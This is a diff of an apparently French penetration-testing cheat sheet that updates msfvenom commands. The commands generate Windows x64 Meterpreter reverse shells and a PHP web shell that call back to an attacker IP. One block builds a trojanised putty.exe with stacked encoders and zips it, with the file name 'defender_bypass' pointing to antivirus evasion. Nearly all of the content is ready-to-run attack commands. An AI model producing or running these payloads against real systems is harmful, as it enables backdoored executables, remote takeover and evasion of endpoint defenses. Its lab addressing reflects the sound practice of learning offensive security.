@@ -242,10 +242,10 @@ msfvenom -lall
 exemple(remplacer votre ip,le port que vous voulez , votre chemin,le nom de fichier, un autre parametre comme -e avec de l encoding ,une option binaire...etc) :
 
 ````bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -b "\x00" -f python
 ````
 ````bash
-msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe lhost=192.168.56.101 lport=8000 -o /home/kali/Desktop/fichier.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows --arch x64 -f exe LHOST=192.168.56.101 LPORT=8000 -o /home/kali/Desktop/fichier.exe
 ````
 ````bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw > /home/kali/Desktop/shell.php
@@ -455,7 +455,7 @@ zip -e -P defender_bypass /home/kali/Desktop/putty_ultimate.zip /home/kali/Deskt
 
 ````bash
 # Générer sur le port 5555
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=5555 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_ultimate.exe
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=5555 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_ultimate.exe
 
 # Zipper
 zip -e -P 1234 /home/kali/Desktop/putty_ultimate.zip /home/kali/Desktop/putty_ultimate.exe
